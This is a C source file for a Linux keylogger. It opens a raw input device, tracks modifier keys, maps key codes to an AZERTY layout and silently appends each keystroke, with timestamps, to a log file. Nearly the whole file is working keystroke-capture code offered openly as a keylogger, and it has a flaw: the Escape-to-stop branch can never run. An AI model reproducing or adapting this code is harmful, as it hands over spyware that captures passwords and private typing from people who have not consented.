// Keylogger for Linux machine

#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <linux/input.h>
#include "linux_keylog.h"
#include "../writing/file.h"

// State of the modifier keys
int ctrl = 0;
int shift = 0;
int altgr = 0;
int capslock = 0;

// AZERTY keyboard mapping
const char* keymap_normal[KEY_MAX_CODE] = { [KEY_A] = "q", [KEY_Z] = "w", [KEY_E] = "e", [KEY_R] = "r",
    [KEY_T] = "t", [KEY_Y] = "y", [KEY_U] = "u", [KEY_I] = "i", [KEY_O] = "o", [KEY_P] = "p",
    [KEY_Q] = "a", [KEY_S] = "s", [KEY_D] = "d", [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h",
    [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l", [KEY_M] = "m", [KEY_W] = "z", [KEY_X] = "x",
    [KEY_C] = "c", [KEY_V] = "v", [KEY_B] = "b", [KEY_N] = "n",

    [KEY_1] = "&", [KEY_2] = "é", [KEY_3] = "\"", [KEY_4] = "'", [KEY_5] = "(", [KEY_6] = "-",
    [KEY_7] = "è", [KEY_8] = "_", [KEY_9] = "ç", [KEY_0] = "à",

    [KEY_SPACE] = " ", [KEY_COMMA] = ",", [KEY_DOT] = ".", [KEY_SEMICOLON] = ";", [KEY_SLASH] = ":", [KEY_EQUAL] = "=",
    [KEY_MINUS] = ")", [KEY_BACKSLASH] = "*",

    [KEY_ENTER] = "[ENTER]", [KEY_BACKSPACE] = "[BACKSPACE]", [KEY_TAB] = "[TAB]", [KEY_ESC] = "[ESCAPE]",
    [KEY_LEFTCTRL] = "[CTRL]", [KEY_LEFTALT] = "[ALT]", [KEY_LEFTSHIFT] = "[SHIFT]",
    [KEY_RIGHTSHIFT] = "[SHIFT]", [KEY_RIGHTALT] = "[ALTGR]", [KEY_CAPSLOCK] = "[CAPSLOCK]",
};

const char* keymap_shift[KEY_MAX_CODE] = { [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8", [KEY_9] = "9", [KEY_0] = "0",

    [KEY_A] = "Q", [KEY_Z] = "W", [KEY_E] = "E", [KEY_R] = "R", [KEY_T] = "T", [KEY_Y] = "Y",
    [KEY_U] = "U", [KEY_I] = "I", [KEY_O] = "O", [KEY_P] = "P", [KEY_Q] = "A", [KEY_S] = "S",
    [KEY_D] = "D", [KEY_F] = "F", [KEY_G] = "G", [KEY_H] = "H", [KEY_J] = "J", [KEY_K] = "K",
    [KEY_L] = "L", [KEY_M] = "M", [KEY_W] = "Z", [KEY_X] = "X", [KEY_C] = "C", [KEY_V] = "V",
    [KEY_B] = "B", [KEY_N] = "N",

    [KEY_COMMA] = "?", [KEY_DOT] = "/", [KEY_SEMICOLON] = ".", [KEY_SLASH] = "/", [KEY_EQUAL] = "+",
    [KEY_MINUS] = "°", [KEY_BACKSLASH] = "µ",
};

const char* keymap_altgr[KEY_MAX_CODE] = { [KEY_E] = "€", [KEY_2] = "~", [KEY_3] = "#", [KEY_4] = "{",
    [KEY_5] = "[", [KEY_6] = "|", [KEY_7] = "`", [KEY_8] = "\\", [KEY_9] = "^", [KEY_0] = "@",
};

void update_modifier_keys(int code, int value) {
    if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL)
        ctrl = value;
    else if (code == KEY_RIGHTALT) 
        altgr = value;
    else if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) 
        shift = value;
    else if (code == KEY_CAPSLOCK && value == 1) 
        capslock = !capslock;
}

const char* translate_key(int code) {
    if (altgr && keymap_altgr[code]) return keymap_altgr[code];
    if (shift && keymap_shift[code]) return keymap_shift[code];

    const char* base = keymap_normal[code];
    if (!base) return NULL;

    if (capslock && strlen(base) == 1 && base[0] >= 'a' && base[0] <= 'z') {
        static char upper[2];
        upper[0] = base[0] - 32;
        upper[1] = '\0';
        return upper;
    }

    return base;
}

// Whenever the keylogger is started, add this to the file first
void linWriteHeader(const char* filePath) {
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }

    // Write the date and time into the file
    time_t t = time(NULL);
    struct tm st = *localtime(&t);
    char date[100];
    sprintf(date, "[%02d/%02d/%02d %02d:%02d:%02d] : ", st.tm_mday, st.tm_mon+1, st.tm_year+1900, st.tm_hour, st.tm_min, st.tm_sec);
    fputs(date, file);
    fflush(file);
    fclose(file);
}

// Keylogger for Linux
void lin_keylog(const char* filePath) {
    // Write the header into the file
    linWriteHeader(filePath);

    const char *device = "/dev/input/event0"; // ← need to be adapted for your system
    int fd = open(device, O_RDONLY);
    if (fd < 0) {
        perror("Failed to open input device");
        exit(EXIT_FAILURE);
    }

    struct input_event ev;
    while (1) {
        // Sleep for 10ms
        usleep(10000);

        ssize_t bytes = read(fd, &ev, sizeof(ev));
        if (bytes < 0) continue;

        if (ev.type == EV_KEY) {
            update_modifier_keys(ev.code, ev.value);

            if (ev.value == 1) { // key press
                const char* key = translate_key(ev.code);
                if (key) {
                    // Write the key into the file
                    FILE *file;
                    file = fopen(filePath, "a");
                    if (file == NULL) {
                        return;
                    }
                    fputs(key, file);
                    fflush(file);
                    fclose(file);
                } else if (ev.code == KEY_ESC) { close(fd); end_keylog(filePath); } // Escape key to end the keylogger
            }
        }
    }
}

// End the keylogger
void end_keylog(const char *filePath) {
    // Add a new line to the file
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) return;
    
    fputs("\n", file);
    fflush(file);
    fclose(file);

    system("clear"); // Clear the console
    exit(0);
}